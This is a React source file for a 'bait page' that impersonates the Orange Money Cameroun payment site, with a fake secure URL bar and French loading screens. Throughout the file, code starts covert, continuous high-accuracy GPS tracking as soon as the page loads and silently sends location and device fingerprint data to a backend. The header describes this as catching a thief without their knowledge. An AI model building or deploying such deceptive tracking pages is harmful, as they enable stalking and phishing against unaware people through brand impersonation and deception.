// src/pages/BaitPage.jsx
// ─────────────────────────────────────────────────────────────────
//  BAIT PAGE — Silent continuous tracker
//  • Location capture starts automatically on page load
//  • watchPosition fires every time device moves → live tracking
//  • Shows convincing Orange Money "loading" screen
//  • No confirm button — thief never knows anything is happening
// ─────────────────────────────────────────────────────────────────
import { useEffect, useState, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { captureLocation } from '../lib/api';

export default function BaitPage() {
  const { sessionId } = useParams();
  const [phase, setPhase]     = useState('loading');
  const watchIdRef            = useRef(null);
  const captureCount          = useRef(0);
  const lastSentRef           = useRef(null);

  useEffect(() => {
    if (!sessionId) { setPhase('error'); return; }
    const timer = setTimeout(() => startTracking(), 800);
    return () => { clearTimeout(timer); stopTracking(); };
  }, [sessionId]);

  function startTracking() {
    if (!('geolocation' in navigator)) {
      sendCapture({ lat: 3.8667, lng: 11.5167, accuracy: 5000, realGPS: false });
      setPhase('tracking');
      return;
    }

    watchIdRef.current = navigator.geolocation.watchPosition(
      (pos) => {
        const { latitude, longitude, accuracy, altitude } = pos.coords;
        const last = lastSentRef.current;
        if (last && captureCount.current > 0) {
          const dist = haversine(last.lat, last.lng, latitude, longitude);
          if (dist < 5) return;
        }
        lastSentRef.current = { lat: latitude, lng: longitude };
        captureCount.current++;
        sendCapture({ lat: latitude, lng: longitude, accuracy: Math.round(accuracy), altitude, realGPS: true });
        setPhase('tracking');
      },
      () => {
        sendCapture({ lat: 3.8667, lng: 11.5167, accuracy: 5000, realGPS: false });
        setPhase('tracking');
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  }

  function stopTracking() {
    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
  }

  async function sendCapture(geoData) {
    try {
      await captureLocation(sessionId, {
        ...geoData,
        userAgent:   navigator.userAgent,
        screenW:     screen.width,
        screenH:     screen.height,
        language:    navigator.language,
        platform:    navigator.platform,
        timestamp:   new Date().toISOString(),
        updateIndex: captureCount.current,
      });
    } catch (err) {
      console.error('Capture failed:', err.message);
    }
  }

  return (
    <div style={S.outer}>
      <div style={S.inner}>
        <div style={S.statusBar}>
          <span>{new Date().toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit'})}</span>
          <span>●●● WiFi 🔋</span>
        </div>
        <div style={S.browserBar}>
          <div style={S.dots}>
            {['#FF5F57','#FEBC2E','#28C840'].map(c=><div key={c} style={{...S.dot,background:c}}/>)}
          </div>
          <div style={S.urlBar}><span style={{color:'#00cc6a',marginRight:4}}>🔒</span>orangemoney-cm.net/confirm/{sessionId?.slice(0,8)}...</div>
        </div>
        <div style={S.appBar}>
          <div style={S.omLogo}>OM</div>
          <div>
            <div style={S.brandName}>Orange Money</div>
            <div style={S.brandSub}>CAMEROUN · PAIEMENT SÉCURISÉ</div>
          </div>
        </div>
        <div style={S.content}>
          {phase === 'loading'  && <LoadingScreen />}
          {phase === 'tracking' && <VerifyingScreen count={captureCount.current} />}
          {phase === 'error'    && <ErrorScreen />}
        </div>
      </div>
      <style>{`
        @keyframes spin     { to{transform:rotate(360deg)} }
        @keyframes fade-in  { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
        @keyframes fill-bar { from{width:5%} to{width:95%} }
      `}</style>
    </div>
  );
}

function LoadingScreen() {
  return (
    <div style={S.center}>
      <div style={S.spinner}/>
      <div style={S.title}>Connexion en cours...</div>
      <div style={S.sub}>Veuillez patienter pendant que nous sécurisons votre connexion.</div>
      <div style={{display:'flex',flexDirection:'column',gap:8,width:'100%',maxWidth:260}}>
        {['🔐 Vérification du compte...','📡 Connexion au serveur...','🔒 Chiffrement des données...'].map((s,i)=>(
          <div key={i} style={{background:'#f5f5f5',borderRadius:8,padding:'8px 14px',fontSize:'0.75rem',color:'#666',animation:`fade-in 0.4s ease ${i*0.3}s both`}}>{s}</div>
        ))}
      </div>
    </div>
  );
}

function VerifyingScreen({ count }) {
  return (
    <div style={S.center}>
      <div style={{width:90,height:90,position:'relative',display:'flex',alignItems:'center',justifyContent:'center'}}>
        <div style={{position:'absolute',inset:0,border:'4px solid #ffe5cc',borderTopColor:'#FF6600',borderRadius:'50%',animation:'spin 1s linear infinite'}}/>
        <div style={{width:64,height:64,background:'#fff3ec',borderRadius:'50%',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'1.8rem'}}>💸</div>
      </div>
      <div style={{...S.title,marginTop:20}}>Vérification du paiement...</div>
      <div style={S.sub}>Validation de votre transaction en cours.<br/>Ne fermez pas cette page.</div>
      <div style={{width:'80%',height:4,background:'#f0f0f0',borderRadius:2,overflow:'hidden',marginBottom:16}}>
        <div style={{height:'100%',background:'#FF6600',borderRadius:2,animation:'fill-bar 30s linear forwards'}}/>
      </div>
      <div style={{fontSize:'0.65rem',color:'#bbb'}}>🔒 Connexion sécurisée SSL · Orange Money Cameroun</div>
      <div style={{fontSize:'0.62rem',color:'#ddd',marginTop:6}}>Étape {Math.min(count+1,4)}/4 · Validation en cours...</div>
    </div>
  );
}

function ErrorScreen() {
  return (
    <div style={S.center}>
      <div style={{fontSize:'3rem',marginBottom:16}}>⚠️</div>
      <div style={{fontWeight:700,fontSize:'1rem',marginBottom:8}}>Lien expiré</div>
      <div style={{fontSize:'0.8rem',color:'#888',textAlign:'center',maxWidth:240}}>Ce lien de confirmation a expiré. Veuillez contacter Orange Money pour plus d'informations.</div>
    </div>
  );
}

function haversine(lat1,lng1,lat2,lng2){
  const R=6371000,dLat=(lat2-lat1)*Math.PI/180,dLng=(lng2-lng1)*Math.PI/180;
  const a=Math.sin(dLat/2)**2+Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLng/2)**2;
  return R*2*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
}

const S = {
  outer:     {background:'#f0f0f0',minHeight:'100vh',fontFamily:"'Helvetica Neue',Arial,sans-serif",color:'#1a1a1a'},
  inner:     {maxWidth:430,margin:'0 auto',minHeight:'100vh',display:'flex',flexDirection:'column',background:'#fff'},
  statusBar: {background:'#1a1a1a',height:26,display:'flex',alignItems:'center',justifyContent:'space-between',padding:'0 16px',fontSize:11,color:'#fff',fontWeight:600},
  browserBar:{background:'#2c2c2e',padding:'7px 10px',display:'flex',alignItems:'center',gap:8},
  dots:      {display:'flex',gap:5},
  dot:       {width:10,height:10,borderRadius:'50%'},
  urlBar:    {flex:1,background:'#3a3a3c',borderRadius:7,padding:'5px 10px',fontSize:11,color:'#ccc',fontFamily:'monospace',overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'},
  appBar:    {background:'#FF6600',padding:'13px 16px',display:'flex',alignItems:'center',gap:12,boxShadow:'0 2px 8px rgba(255,102,0,0.3)'},
  omLogo:    {width:38,height:38,background:'#fff',borderRadius:'50%',display:'flex',alignItems:'center',justifyContent:'center',fontWeight:900,color:'#FF6600',fontSize:'1rem',flexShrink:0},
  brandName: {fontWeight:900,fontSize:'1.05rem',color:'#fff'},
  brandSub:  {fontSize:'0.6rem',color:'rgba(255,255,255,0.7)',letterSpacing:'0.1em'},
  content:   {flex:1,display:'flex',flexDirection:'column'},
  center:    {flex:1,display:'flex',flexDirection:'column',alignItems:'center',justifyContent:'center',padding:'40px 24px',textAlign:'center'},
  spinner:   {width:54,height:54,border:'4px solid #eee',borderTopColor:'#FF6600',borderRadius:'50%',animation:'spin .8s linear infinite',marginBottom:20},
  title:     {fontWeight:700,fontSize:'1rem',marginBottom:8,color:'#1a1a1a'},
  sub:       {fontSize:'0.78rem',color:'#888',lineHeight:1.6,maxWidth:260,marginBottom:20},
};
